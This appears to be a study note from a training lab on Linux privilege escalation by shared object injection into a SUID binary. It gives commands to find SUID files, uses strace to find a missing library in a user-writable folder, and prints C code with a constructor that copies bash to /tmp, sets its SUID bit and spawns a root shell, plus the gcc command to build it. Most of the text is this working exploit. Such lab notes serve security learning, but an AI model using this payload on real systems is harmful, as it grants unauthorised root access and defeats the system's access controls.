# shared object injection

**SUID (S , 04000)**→ privilege which file run with creator privilege not user who’s run it

we start to know which file run with SUID

```bash
find / -type f -perm -u=s -ls 2>/dev/null
#  or
find / -type f -perm 04000 -ls 2>/dev/null
```

![image.png](<../../../.gitbook/assets/image (19).png>)

**Strace** → tool which use to spectate of system calls function

.so → use to run library before the system library

```bash
strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
# use to eun suid.so and search on this words to find file can be inject a malicious code in it
```

<figure><img src="../../../.gitbook/assets/image 1 (8).png" alt=""><figcaption></figcaption></figure>

so this c code which will inject

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

we create a file and we start to convert this file to library

```bash
gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/malicious.c 
```

then run the main `file suid-so`

```bash
usr/local/bin/suid-so
```

<figure><img src="../../../.gitbook/assets/image 2 (7).png" alt=""><figcaption></figcaption></figure>

***

***

### why we choose this library `/home/user/.config/libcalc.so` ?

which return value 3 that’s mean Strace success to open it like all marked green in photo

but these libraries which load from places the user can’t open or edit it but this place `/home/user/.config/libcalc.so` the user can edit it and inject a malicious code

<figure><img src="../../../.gitbook/assets/image 3 (6).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image 4 (5).png" alt=""><figcaption></figcaption></figure>
